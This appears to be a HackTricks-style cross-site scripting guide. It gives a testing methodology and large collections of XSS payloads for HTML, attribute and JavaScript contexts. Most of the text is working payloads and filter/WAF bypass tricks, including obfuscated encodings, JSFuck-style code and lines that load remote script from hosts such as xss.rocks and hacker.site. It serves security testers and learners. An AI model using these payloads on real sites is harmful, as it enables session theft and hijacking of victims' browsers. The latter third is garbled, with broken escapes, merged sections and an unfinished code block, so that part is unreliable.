# XSS (Cross Site Scripting)

## Methodology

1. Check if **any value you control** (_parameters_, _path_, _headers_?, _cookies_?) is being **reflected** in the HTML or **used** by **JS** code.
2. **Find the context** where it's reflected/used.
3. If **reflected**
   1. Check **which symbols can you use** and depending on that, prepare the payload:
      1. In **raw HTML**:&#x20;
         1. Can you create new HTML tags?
         2. Can you use events or attributes supporting `javascript:` protocol?
         3. Can you bypass protections?
         4. Is the HTML content being interpreted by any client side JS engine (_AngularJS_, _VueJS_, _Mavo_...), you could abuse a [**Client Side Template Injection**](client-side-template-injection-csti).
         5. If you cannot create HTML tags that execute JS code, could you abuse a [**Dangling Markup - HTML scriptless injection**](dangling-markup-html-scriptless-injection)?
      2. Inside a **HTML tag**:
         1. Can you exit to raw HTML context?
         2. Can you create new events/attributes to execute JS code?
         3. Does the attribute where you are trapped support JS execution?
         4. Can you bypass protections?
      3. Inside **JavaScript code**:
         1. Can you escape the `<script>` tag?
         2. Can you escape the string and execute different JS code?
         3. Are your input in template literals \`\`?
         4. Can you bypass protections?
4. If **used**:
   1. You could exploit a **DOM XSS**, pay attention how your input is controlled and if your **controlled input is used by any sink.**

## Reflected values

In order to successfully exploit a XSS the first thing you need to find is a **value controlled by you that is being reflected** in the web page.

* **Intermediately reflected**: If you find that the value of a parameter or even the path is being reflected in the web page you could exploit a **Reflected XSS**.
* **Stored and reflected**: If you find that a value controlled by you is saved in the server and is reflected every time you access a page you could exploit a **Stored XSS**.
* **Accessed via JS**: If you find that a value controlled by you is being access using JS you could exploit a **DOM XSS**.

## Contexts

When trying to exploit a XSS the first thing you need to know if **where is your input being reflected**. Depending on the context, you will be able to execute arbitrary JS code on different ways.

### Raw HTML

If your input is **reflected on the raw HTML** page you will need to abuse some **HTML tag** in order to execute JS code: `<img , <iframe , <svg , <script` ... these are just some of the many possible HTML tags you could use.\
Also, keep in mind [Client Side Template Injection](client-side-template-injection-csti).

### Inside HTML tags attribute

If your input is reflected inside the value of the attribute of a tag you could try:

1. To **escape from the attribute and from the tag** (then you will be in the raw HTML) and create new HTML tag to abuse: `"><img [...]`
2. If you **can escape from the attribute but not from the tag** (`>` is encoded or deleted), depending on the tag you could **create an event** that executes JS code: `" autofocus onfocus=alert(1) x="`
3. If you **cannot escape from the attribute** (`"` is being encoded or deleted), then depending on **which attribute** your value is being reflected in **if you control all the value or just a part** you will be able to abuse it. For **example**, if you control an event like `onclick=` you will be able to make it execute arbitrary code when it's clicked. Another interesting **example** is the attribute `href`, where you can use the `javascript:` protocol to execute arbitrary code: **`href="javascript:alert(1)"`**
4. If your input is reflected inside "**unexpoitable tags**" you could try the **`accesskey`** trick to abuse the vuln (you will need some kind of social engineer to exploit this): **`" accesskey="x" onclick="alert(1)" x="`**

### Inside JavaScript code

In this case your input is reflected between **`<script> [...] </script>`** tags of a HTML page, inside a **`.js`**&#x66;ile or inside an attribute using **`javascript:`** protocol:

* If reflected between **`<script> [...] </script>`** tags, even if your input if inside any kind of quotes, you can try to inject `</script>` and escape from this context. This works because the **browser will first parse the HTML tags** and then the content, therefore, it won't notice that your injected `</script>` tag is inside the HTML code.
* If reflected **inside a JS string** and the last trick isn't working you would need to **exit** the string, **execute** your code and **reconstruct** the JS code (if there is any error, it won't be executed:
  * `'-alert(1)-'`
  * `';-alert(1)//`
  * `\';alert(1)//`
* If reflected inside template literals \`\` you can **embed JS expressions** using `${ ... }` syntax: `` `var greetings = ``Hello, ${alert(1)}\`\`\`

### DOM

There is **JS code** that is using **unsafely** some **data controlled by an attacker** like `location.href` . An attacker, could abuse this to execute arbitrary JS code.

{% content-ref url="xss-cross-site-scripting/dom-xss" %}
[dom-xss](xss-cross-site-scripting/dom-xss)
{% endcontent-ref %}

### **Universal XSS**

These kind of XSS can be found **anywhere**. They not depend just on the client exploitation of a web application but on **any** **context**. These kind of **arbitrary JavaScript execution** can even be abuse to obtain **RCE**, **read** **arbitrary** **files** in clients and servers, and more.\
Some **examples**:

{% content-ref url="xss-cross-site-scripting/server-side-xss-dynamic-pdf" %}
[server-side-xss-dynamic-pdf](xss-cross-site-scripting/server-side-xss-dynamic-pdf)
{% endcontent-ref %}

{% content-ref url="../pentesting/pentesting-web/xss-to-rce-electron-desktop-apps" %}
[xss-to-rce-electron-desktop-apps](../pentesting/pentesting-web/xss-to-rce-electron-desktop-apps)
{% endcontent-ref %}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](https://1116388331-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-Mks5MA8MikNk7jIq3z3%2Fsync%2Fdabf90386fb0b4f05fc3daadb4c3fffceed34767.jpg?generation=1633028922331513\&alt=media)

## Injecting inside raw HTML

When your input is reflected **inside the HTML page** or you can escape and inject HTML code in this context the **first** thing you need to do if check if you can abuse `<` to create new tags: Just try to **reflect** that **char** and check if it's being **HTML encoded** or **deleted** of if it is **reflected without changes**. **Only in the last case you will be able to exploit this case**.\
For this cases also **keep in mind** [**Client Side Template Injection**](client-side-template-injection-csti)**.**\
&#xNAN;_**Note: A HTML comment can be closed using****&#x20;****`-->`****&#x20;****or****&#x20;****`--!>`**_

In this case and if no black/whitelisting is used, you could use payloads like:

```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>
```

But, if tags/attributes black/whitelisting is being used, you will need to **brute-force which tags** you can create.\
Once you have **located which tags are allowed**, you would need to **brute-force attributes/events** inside the found valid tags to see how you can attack the context.

### Tags/Events brute-force

Go to [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click on _**Copy tags to clipboard**_. Then, send all of them using Burp intruder and check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can **brute force all the events** using the valid tags (in the same web page click on _**Copy events to clipboard**_ and follow the same procedure as before).

### Custom tags

If you didn't find any valid HTML tag, you could try to **create a custom tag** and and execute JS code with the `onfocus` attribute. In the XSS request, you need to end the URL with `#` to make the page **focus on that object** and **execute** the code:

```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```

### Blacklist Bypasses

If some kind of blacklist is being used you could try to bypass it with some silly tricks:

```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```

### Length bypass (XSS in 20chars)

Taken from the blog of [Jorge Lajara](https://jlajara.gitlab.io/posts/2019/11/30/XSS_20_characters.html).

```javascript
<svg/onload=alert``>
<script src=//aa.es>
<script src=//℡㏛.pw>
```

The last one is using 2 unicode characters which expands to 5: telsr\
More of these characters can be found [here](https://www.unicode.org/charts/normalization/).\
To check in which characters are decomposed check [here](https://www.compart.com/en/unicode/U+2121).\
**More tiny XSS for different environments** payload [**can be found here**](https://github.com/terjanq/Tiny-XSS-Payloads) **\*\*and \[**&#x68;ere\*\*]\([https://tinyxss.terjanq.me/](https://tinyxss.terjanq.me/)).

### Click XSS - Clickjacking

If in order to exploit the vulnerability you need the **user to click a link or a form** with prepopulated data you could try to [**abuse Clickjacking**](../clickjacking#xss-clickjacking) (if the page is vulnerable).

### Impossible - Dangling Markup

If you just think that **it's impossible to create an HTML tag with an attribute to execute JS code**, you should check [**Danglig Markup** ](dangling-markup-html-scriptless-injection)because you could **exploit** the vulnerability **without** executing **JS** code.

## Injecting inside HTML tag

### Inside the tag/escaping from attribute value

If you are in **inside a HTML tag**, the first thing you could try is to **escape** from the tag and use some of the techniques mentioned in the [previous section](#injecting-inside-raw-html) to execute JS code.\
If you **cannot escape from the tag**, you could create new attributes inside the tag to try to execute JS code, for example using some payload like (_note that in this example double quotes are use to escape from the attribute, you won't need them if your input is reflected directly inside the tag_):

```javascript
" autofocus onfocus=alert(document.domain) x="
```

#### Style events

```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```

### Within the attribute

Even if you **cannot escape from the attribute** (`"` is being encoded or deleted), depending on **which attribute** your value is being reflected in **if you control all the value or just a part** you will be able to abuse it. For **example**, if you control an event like `onclick=` you will be able to make it execute arbitrary code when it's clicked.\
Another interesting **example** is the attribute `href`, where you can use the `javascript:` protocol to execute arbitrary code: **`href="javascript:alert(1)"`**

#### **Bypass inside event using HTML encoding/URL encode**

The **HTML encoded characters** inside the value of HTML tags attributes are **decoded on runtime**. Therefore something like the following will be valid (the payload is in bold): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Note that **any kind of HTML encode is valid**:

```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```

**Note that URL encode will also work:**

```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```

#### Bypass inside event using Unicode encode

```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```

### Special Protocols Within the attribute

There you can use the protocols **`javascript:`** or **`data:`** in some places to **execute arbitrary JS code**. Some will require user interaction on some won't.

```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)
java        //Note the new line 
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```

#### Places where you can inject these protocols

**In general** the `javascript:` protocol can be **used in any tag that accepts the attribute `href`** and in **most** of the tags that accepts the **attribute `src`** (but not `<img`)

```markup
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf 
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf 
<iframe srcdoc="<svg onload=alert(4);>">
```

#### Other obfuscation tricks

_**In this case the HTML encoding and the Unicode encoding trick from the previous section is also valid as you are inside an attribute.**_

```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```

Moreover, there is another **nice trick** for these case&#x73;**: Even if your input inside `javascript:...` is being URL encoded, it will be URL decoded before it's executed.** So, if you need to **escape** from the **string** using a **single quote** and you see that **it's being URL encoded**, remember that **it doesn't matter,** it will be **interpreted** as a **single quote** during the **execution** time.

```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```

Note that if you try to **use both** `URLencode + HTMLencode` in any order to encode the **payload** it **won't** **work**, but you can **mix them inside the payload**.

#### Using Hex and Octal encode with `javascript:`

You can use **Hex** and **Octal encode** inside the `src` attribute of `iframe` (at least) to declare **HTML tags to execute JS**:

```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```

### Reverse tab nabbing

```javascript
<a target="_blank" rel="opener"
```

If you can inject any URL in an arbitrary **`<a href=`** tag that contains the **`target="_blank" and rel="opener"`** attributes, check the **following page to exploit this behavior**:

{% content-ref url="reverse-tab-nabbing" %}
[reverse-tab-nabbing](reverse-tab-nabbing)
{% endcontent-ref %}

### on Event Handlers Bypass

First of all check this page ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) for useful **"on" event handlers**.\
In case there is some blacklist preventing you from creating this even handlers you can try the following bypasses:

```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```

### XSS in "Unexploitable tags" (input hidden, link, canonical)

From [here](https://portswigger.net/research/xss-in-hidden-input-fields):\
You can execute an **XSS payload inside a hidden attribute**, provided you can **persuade** the **victim** into pressing the **key combination**. On Firefox Windows/Linux the key combination is **ALT+SHIFT+X** and on OS X it is **CTRL+ALT+X**. You can specify a different key combination using a different key in the access key attribute. Here is the vector:

```markup
<input type="hidden" accesskey="X" onclick="alert(1)">
```

T**he XSS payload will be something like this: `" accesskey="x" onclick="alert(1)" x="`**

### Blacklist Bypasses

Several tricks with using different encoding were exposed already inside this section. Go **back to learn where can you use HTML encoding, Unicode encoding, URL encoding, Hex and Octal encoding and even data encoding**.

#### Bypasses for HTML tags and attributes

Read the[ Blacklist Bypasses of the previous section](#blacklist-bypasses).

#### Bypasses for JavaScript code

Read the J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

## Injecting inside JavaScript code

In these case you **input** is going to be **reflected inside the JS code** of a `.js` file or between `<script>...</script>` tags or between HTML events that can execute JS code or between attributes that accepts the `javascript:` protocol.

### Escaping \<script> tag

If your code is inserted within `<script> [...] var input = 'reflected data' [...] </script>` you could easily **escape closing the `<script>`** tag:

```javascript
</script><img src=1 onerror=alert(document.domain)>
```

Note that in this example we **haven't even closed the single quote**, but that's not necessary as the **browser first performs HTML parsing** to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts.

### Inside JS code

If `<>` are being sanitised you can still **escape the string** where your input is being **located** and **execute arbitrary JS**. It's important to **fix JS syntax**, because if there are any errors, the JS code won't be executed:

```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```

### Template literals \`\`

In order to construct **strings** apart from single and double quotes JS also accepts **backticks** **\`\`\`\`\`\`\`\`** . This is known as template literals as they allow to **embedded JS expressions** using `${ ... }` syntax.\
Therefore, if you find that your input is being **reflected** inside a JS string that is using backticks, you can abuse the syntax `${ ... }` to execute **arbitrary JS code**:

This can be **abused** using: `${alert(1)}`

### Encoded code execution

```markup
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>">
```

### JavaScript bypass blacklists techniques

#### Strings

```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```

#### Space substitutions inside JS code

```javascript
<TAB>
/**/
```

#### JavaScript without parentheses

```javascript
alert`1`
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
eval.call`${'alert\x2823\x29'}`
eval.apply`${[`alert\x2823\x29`]}`
```

* [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
* [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

#### JavaScript comments (from [JavaScript Comments](#javascript-comments) trick)

```javascript
//This is a 1 line comment
/* This is a multiline comment*/
#!This is a 1 line comment, but "#!" must to be at the beggining of the line
-->This is a 1 line comment, but "-->" must to be at the beggining of the line
```

#### JavaScript new lines (from [JavaScript new line](#javascript-new-lines) trick)

```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10) //0x0a
String.fromCharCode(13) //0x0d
String.fromCharCode(8232) //0xe2 0x80 0xa8
String.fromCharCode(8233) //0xe2 0x80 0xa8
```

#### Arbitrary function (alert) call

```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}
```

//General function executions ``//Can be use as parenthesis alert`document.cookie` alert(document['cookie']) with(document)alert(cookie) (alert)(1) (alert(1))in"." a=alert,a(1) [1].find(alert) window['alert'](0) parent['alert'](1) self['alert'](2) top['alert'](3) this['alert'](4) frames['alert'](5) content['alert'](6) [7].map(alert) [8].find(alert) [9].every(alert) [10].filter(alert) [11].findIndex(alert) [12].forEach(alert); top[/al/.source+/ert/.source](1) top[8680439..toString(30)](1) Function("ale"+"rt(1)")(); new Function`al\ert\`6\``; Set.constructor('ale'+'rt(13)')(); Set.constructor`al\x65rt\x2814\x29```; $='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y) x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y)) this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array) globalThis[`al`+/ert/.source]`1`this[`al`+/ert/.source]`1`[alert][0].call(this,1) window['a'+'l'+'e'+'r'+'t']() window['a'+'l'+'e'+'r'+'t'].call(this,1) top['a'+'l'+'e'+'r'+'t'].apply(this,[1]) (1,2,3,4,5,6,7,8,alert)(1) x=alert,x(1) [1].find(alert) top["al"+"ert"](1) top[/al/.source+/ert/.source](1) al\u0065rt(1) al\u0065rt`1\` top['al\145rt'](https://github.com/boitatech/hacktricks/tree/14ead4a6929a3874c3681cbe46d7279d0916673d/pentesting-web/xss-cross-site-scripting/1/README.md) top['al\x65rt'](https://github.com/boitatech/hacktricks/tree/14ead4a6929a3874c3681cbe46d7279d0916673d/pentesting-web/xss-cross-site-scripting/1/README.md) top[8680439..toString(30)](https://github.com/boitatech/hacktricks/tree/14ead4a6929a3874c3681cbe46d7279d0916673d/pentesting-web/xss-cross-site-scripting/1/README.md)

\`\`\` ## \*\*DOM vulnerabilities\*\* There is \*\*JS code\*\* that is using \*\*unsafely data controlled by an attacker\*\* like \`location.href\` . An attacker, could abuse this to execute arbitrary JS code. \*\*Due to the extension of the explanation of\*\* \[\*\*DOM vulnerabilities it was moved to this page\*\*]\(dom-xss.md)\*\*:\*\* \{% page-ref page="dom-xss.md" %\} There you will find a detailed \*\*explanation of what DOM vulnerabilities are, how are they provoked, and how to exploit them\*\*. Also, don't forget that \*\*at the end of the mentioned post\*\* you can find an explanation about \[\*\*DOM Clobbering attacks\*\*]\(dom-xss.md#dom-clobbering). ## Other Bypasses ### Normalised Unicode You could check is the \*\*reflected values\*\* are being \*\*unicode normalized\*\* in the server \\(or in the client side\\) and abuse this functionality to bypass protections. \[\*\*Find an example here\*\*]\(../unicode-normalization-vulnerability.md#xss-cross-site-scripting). ### PHP FILTER\\\_VALIDATE\\\_EMAIL flag Bypass \`\`\`javascript ">"@x.y \`\`\` ### Ruby-On-Rails bypass Due to \*\*RoR mass assignment\*\* quotes are inserted in the HTML and then the quote restriction is bypassed and additoinal fields \\(onfocus\\) can be added inside the tag. Form example \\(\[from this report]\(https://hackerone.com/reports/709336)\\), if you send the payload: \`\`\`text contact\[email] onfocus=javascript:alert('xss') autofocus a=a\&form\_type\[a]aaa \`\`\` The pair "Key","Value" will be echoed back like this: \`\`\`text {" onfocus=javascript:alert('xss') autofocus a"=>"a"} \`\`\` Then, the onfocus attribute will be inserted: !\[]\(../../.gitbook/assets/image%20%2882%29.png) A XSS occurs. ### Special combinations \`\`\`markup ![](https://github.com/boitatech/hacktricks/tree/14ead4a6929a3874c3681cbe46d7279d0916673d/pentesting-web/xss-cross-site-scripting/1) alert(1) alert('XSS')\
\<svg/onload=location=\`javas\`+\`cript:ale\`+\`rt%2\`+\`81%2\`+\`9\`;//\
\<svg////////onload=alert(1)>\
\<svg id=x;onload=alert(1)>\
\<svg id=\`x\`onload=alert(1)>\
\<img src=1 alt=al lang=ert onerror=top\[alt+lang]\(0)>\
\<script>$=1,alert($)confirm(1)$=1,\u0061lert($)\<eval('\\\u'+'0061'+'lert(1)')//<\u0061lert(1)alert(1) ![String.fromCharCode(88,83,83)](x:prompt\(eval\(alt\)\))alert('1'\&#41\</x>\
\<iframe src=""/srcdoc='\<svg onload=alert(1)>'>\
\<svg>\<animate onbegin=alert() attributeName=x>\</svg>\
\<img/id="alert('XSS')\\"/alt=\\"/\\"src=\\"/\\"onerror=eval(id)>\
\<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);"\
\`\`\`\
\
\### XSS with header injection in a 302 response\
\
If you find that you can \*\*inject headers in a 302 Redirect response\*\* you could try to \*\*make the browser execute arbitrary JavaScript\*\*. This is \*\*not trivial\*\* as modern browsers do not interpret the HTTP response body if the HTTP response status code is a 302, so just a cross-site scripting payload is useless.\
\
In \[\*\*this report\*\*]\(https://www.gremwell.com/firefox-xss-302) and \[\*\*this one\*\*]\(https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) you can read how you can test several protocols inside the Location header and see if any of them allows the browser to inspect and execute the XSS payload inside the body.  \
Past known protocols: \`mailto://\`, \`//x:1/\`, \`ws://\`, \`wss://\`, \_empty Location header\_, \`resource://\`.\
\
\### Obfuscation & Advanced Bypass\
\
\* \[https://github.com/aemkei/katakana.js]\(https://github.com/aemkei/katakana.js)\
\* \[https://ooze.ninja/javascript/poisonjs]\(https://ooze.ninja/javascript/poisonjs) \
\* \[https://javascriptobfuscator.herokuapp.com/]\(https://javascriptobfuscator.herokuapp.com/) \
\* \[https://skalman.github.io/UglifyJS-online/]\(https://skalman.github.io/UglifyJS-online/) \
\* \[http://www.jsfuck.com/]\(http://www.jsfuck.com/)\
\* More sofisticated JSFuck: \[https://medium.com/@Master\\\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce]\(https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)\
\* \[http://utf-8.jp/public/jjencode.html]\(http://utf-8.jp/public/jjencode.html)\
\* \[https://utf-8.jp/public/aaencode.html]\(https://utf-8.jp/public/aaencode.html)\
\
\`\`\`javascript\
//Katana\
\<script>(\[,ウ,,,,ア]=\[]+{},\[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=\[!!ウ]+!ウ+ウ.ウ)\[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ]\[ツ]\(ミ+ハ+セ+ホ+ネ+'(-\~ウ)')() \`\`\` \`\`\`javascript //JJencode$=\~\[];$={\_\_\_:++$,$:(!\[]+"")\[$],\_\_$:++$,$\_$\_:(!\[]+"")\[$],\_$\_:++$,$\_$:({}+"")\[$],$\_$:($\[$]+"")\[$],\_$:++$,$\_:(!""+"")\[$],$\_\_:++$,$\_$:++$,$\_\_:({}+"")\[$],$\_:++$,$:++$,$\_\_\_:++$,$\_\_$:++$};$.$\_=($.$\_=$+"")\[$.$\_$]+($.\_$=$.$\_\[$.\_\_$])+($.$=($.$+"")\[$.\_\_$])+((!$)+"")\[$.\_$]+($.\_\_=$.$\_\[$.$\_])+($.$=(!""+"")\[$.\_\_$])+($.\_=(!""+"")\[$.\_$\_])+$.$\_\[$.$\_$]+$.\_\_+$.\_$+$.$;$.$=$.$+(!""+"")\[$.\_$]+$.\_\_+$.\_+$.$+$.$;$.$=($.\_\_\_)\[$.$\_]\[$.$\_];$.$($.$($.$+"\\""+$.$\_$\_+(!\[]+"")\[$.\_$\_]+$.$\_+"\\\\"+$.\_\_$+$.$\_+$.\_$\_+$.\_\_+"("+$.\_\_\_+")"+"\\"")())(); \`\`\` \`\`\`javascript 